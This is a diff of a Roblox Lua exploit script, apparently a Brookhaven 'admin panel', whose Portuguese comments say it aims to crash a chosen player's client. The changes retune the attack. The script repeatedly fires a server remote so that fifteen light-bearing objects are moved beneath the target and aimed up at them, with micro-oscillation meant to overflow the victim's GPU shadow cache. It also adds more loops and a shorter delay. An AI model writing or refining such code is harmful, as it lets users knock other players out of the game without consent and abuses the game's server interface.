@@ -632,7 +632,7 @@ MainTab:Button({
             return
         end
 
-        -- Altere para o nome exato da pasta onde o Brookhaven guarda os novos Stadium Lights
+        -- Altere para o nome da pasta dos holofotes do estádio
         local pastaPostes = WorkspaceCom and WorkspaceCom:FindFirstChild("001_TrafficCones") 
         if not pastaPostes then
             WindUI:Notify({Title = "❌ Erro Admin", Content = "Pasta de Holofotes não mapeada.", Duration = 3})
@@ -641,21 +641,20 @@ MainTab:Button({
 
         WindUI:Notify({
             Title = "🛡️ Painel Admin", 
-            Content = "Alinhando holofotes e forçando colapso de GPU em " .. targetPlayer.Name .. "...", 
+            Content = "Fundindo holofotes inferiores e forçando crash em " .. targetPlayer.Name .. "...", 
             Duration = 3
         })
 
         local character = targetPlayer.Character
-        -- Focamos no peito (UpperTorso) ou cabeça, garantindo que o feixe de luz corte a lente da câmera dele
-        local targetCenter = character:FindFirstChild("UpperTorso") or character:FindFirstChild("HumanoidRootPart")
+        -- Centraliza no ponto de física do alvo (HumanoidRootPart)
+        local targetCenter = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso")
         local postes = pastaPostes:GetChildren()
         
         if targetCenter and #postes > 0 then
-            -- Ativa a sobrecarga em threads assíncronas controladas
             task.spawn(function()
                 pcall(function()
-                    -- Roda um bombardeio contínuo curto para garantir o travamento até o processo fechar
-                    for loop = 1, 10 do
+                    -- Roda os ciclos assíncronos rápidos para forçar o fechamento do Roblox do alvo
+                    for loop = 1, 12 do
                         if not targetPlayer or not targetPlayer.Parent then break end
                         
                         for i, poste in pairs(postes) do
@@ -664,27 +663,24 @@ MainTab:Button({
                                 
                                 task.spawn(function()
                                     pcall(function()
-                                        -- MATEMÁTICA DE ALINHAMENTO COMPACTO:
-                                        -- Distribuímos os 15 postes em um anel bem apertado ao redor do alvo
-                                        local raioApertado = 3 -- Mantém os postes colados nele para engolir a câmera
-                                        local radianos = (i * (math.pi * 2 / #postes)) + (tick() * 5) -- Gira levemente para flutuar as sombras
+                                        -- MATEMÁTICA DE INVERSÃO INFERIOR (8 studs para baixo):
+                                        -- Move a fusão física de todos os 15 postes para o subsolo do alvo
+                                        local posicaoSubsoloPoste = targetCenter.Position + Vector3.new(0, -8, 0)
                                         
-                                        local offsetX = math.cos(radianos) * raioApertado
-                                        local offsetZ = math.sin(radianos) * raioApertado
-                                        local offsetY = 5 -- Posiciona os holofotes ligeiramente acima para apontarem para baixo
+                                        -- Micro-oscilação decimal contínua para estourar o cache de sombras da GPU dele
+                                        local microGiro = math.sin(tick() * 25 + i) * 0.01
+                                        local pontoFocoLuz = targetCenter.Position + Vector3.new(microGiro, 0, microGiro)
                                         
-                                        local posicaoPoste = targetCenter.Position + Vector3.new(offsetX, offsetY, offsetZ)
+                                        -- Força as frentes dos postes a mirarem exatamente para cima, apontando os 15 holofotes no peito do alvo
+                                        local destinoInvertido = CFrame.lookAt(posicaoSubsoloPoste, pontoFocoLuz)
                                         
-                                        -- CFrame.lookAt força o poste (e o cone de luz dele) a mirar exatamente no peito do alvo
-                                        local destinoAlinhado = CFrame.lookAt(posicaoPoste, targetCenter.Position)
-                                        
-                                        setCFrameRemote:InvokeServer(destinoAlinhado)
+                                        setCFrameRemote:InvokeServer(destinoInvertido)
                                     end)
                                 end)
                                 
                             end
                         end
-                        task.wait(0.05) -- Delay cirúrgico para inundar a renderização sem travar você
+                        task.wait(0.04) -- Taxa de envio estável para o seu cliente, fatal para o alvo
                     end
                 end)
             end)
